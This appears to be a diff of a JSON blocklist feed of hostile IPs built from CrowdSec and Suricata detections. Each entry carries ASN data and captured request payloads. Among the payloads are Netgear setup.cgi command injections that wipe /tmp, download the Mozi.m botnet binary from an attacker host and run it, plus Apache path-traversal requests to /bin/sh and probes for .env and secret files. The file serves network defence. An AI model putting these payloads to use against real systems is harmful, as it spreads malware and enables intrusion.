@@ -1,185 +1,13 @@
 {
-  "generated_at": "2026-05-24T01:00:00Z",
+  "generated_at": "2026-05-24T13:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
-    "total": 58,
-    "v4": 58,
+    "total": 53,
+    "v4": 53,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "139.135.41.58",
-      "family": "v4",
-      "first_seen": "2026-05-17T10:00:00Z",
-      "last_seen": "2026-05-17T10:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP Cyber Internet Services Pvt Ltd.",
-      "asn_prefix": "139.135.41.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://139.135.41.58:36962/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://139.135.41.58:36962/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "20.151.174.218",
-      "family": "v4",
-      "first_seen": "2026-05-17T10:00:00Z",
-      "last_seen": "2026-05-17T10:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-backdoors-attempts",
-        "crowdsec/http-probing",
-        "crowdsec/http-technology-probing",
-        "crowdsec/http-wordpress-scan"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.150.0.0/15",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /public/css.php",
-        "GET /1.php",
-        "GET /info.php",
-        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
-        "GET /wp-content/admin.php",
-        "GET /wp-admin/images/admin.php",
-        "GET /wp-admin/css/colors/index.php",
-        "GET /admin.php",
-        "GET /goods.php",
-        "GET /alfa.php",
-        "GET /css.php",
-        "GET /classwithtostring.php",
-        "GET /gelay.php",
-        "GET /adminfuns.php"
-      ]
-    },
-    {
-      "ip": "20.65.194.123",
-      "family": "v4",
-      "first_seen": "2026-05-17T08:00:00Z",
-      "last_seen": "2026-05-17T08:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.64.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /developmentserver/metadatauploader"
-      ]
-    },
-    {
-      "ip": "136.107.30.59",
-      "family": "v4",
-      "first_seen": "2026-05-17T06:00:00Z",
-      "last_seen": "2026-05-17T06:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files",
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "136.107.0.0/17",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /administrator/.env",
-        "GET /phpinfo.php",
-        "GET /phpinfo",
-        "GET /info.php",
-        "GET /",
-        "GET /.git/config",
-        "GET /.env",
-        "GET /.env.local",
-        "GET /.env.production",
-        "GET /.env.staging",
-        "GET /.env.development",
-        "GET /.env.test",
-        "GET /.env.remote",
-        "GET /.env.bak",
-        "GET /.env.backup"
-      ]
-    },
-    {
-      "ip": "51.68.111.243",
-      "family": "v4",
-      "first_seen": "2026-05-17T06:00:00Z",
-      "last_seen": "2026-05-17T06:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "16276",
-      "asn_name": "OVH OVH SAS",
-      "asn_prefix": "51.68.0.0/16",
-      "payloads": [
-        "GET /robots.txt",
-        "GET /"
-      ]
-    },
-    {
-      "ip": "106.13.122.198",
-      "family": "v4",
-      "first_seen": "2026-05-17T08:00:00Z",
-      "last_seen": "2026-05-17T08:00:00Z",
-      "scenarios": [
-        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "38365",
-      "asn_name": "BAIDU Beijing Baidu Netcom Science and Technology Co., Ltd.",
-      "asn_prefix": "106.13.96.0/19",
-      "payloads": [
-        "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
-        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
-      ]
-    },
-    {
-      "ip": "45.139.122.80",
-      "family": "v4",
-      "first_seen": "2026-05-17T10:00:00Z",
-      "last_seen": "2026-05-17T10:00:00Z",
-      "scenarios": [
-        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 13"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "206264",
-      "asn_name": "AMARUTU-TECHNOLOGY Amarutu Technology Ltd",
-      "asn_prefix": "45.139.122.0/24"
-    },
     {
       "ip": "199.45.154.141",
       "family": "v4",
@@ -1426,6 +1254,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.160.0.0/12",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -1447,6 +1278,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "41608",
+      "asn_name": "NextGenWebs-NL NextGenWebs, S.L.",
+      "asn_prefix": "185.213.174.0/24",
       "payloads": [
         "GET /docker-compose.production.yml",
         "GET /config.env",
@@ -1482,6 +1316,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP Cyber Internet Services Pvt Ltd.",
+      "asn_prefix": "72.255.32.0/24",
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://72.255.32.50:44020/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1"
       ]
@@ -1500,6 +1337,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "52.224.0.0/11",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -1537,6 +1377,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "398722",
+      "asn_name": "CENSYS-ARIN-03 - Censys",
+      "asn_prefix": "199.45.155.0/24",
       "tags": [
         "mwl:scanner=\"censys\""
       ],
@@ -1556,12 +1399,51 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "398722",
+      "asn_name": "CENSYS-ARIN-03 - Censys",
+      "asn_prefix": "199.45.154.0/24",
       "tags": [
         "mwl:scanner=\"censys\""
       ],
       "payloads": [
         "GET /",
         "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "20.98.140.180",
+      "family": "v4",
+      "first_seen": "2026-05-24T08:00:00Z",
+      "last_seen": "2026-05-24T08:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /owa/auth/logon.aspx"
+      ]
+    },
+    {
+      "ip": "184.105.139.69",
+      "family": "v4",
+      "first_seen": "2026-05-24T07:00:00Z",
+      "last_seen": "2026-05-24T07:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:scanner=\"shadowserver\""
+      ],
+      "payloads": [
+        "GET /remote/logincheck"
       ]
     }
   ]
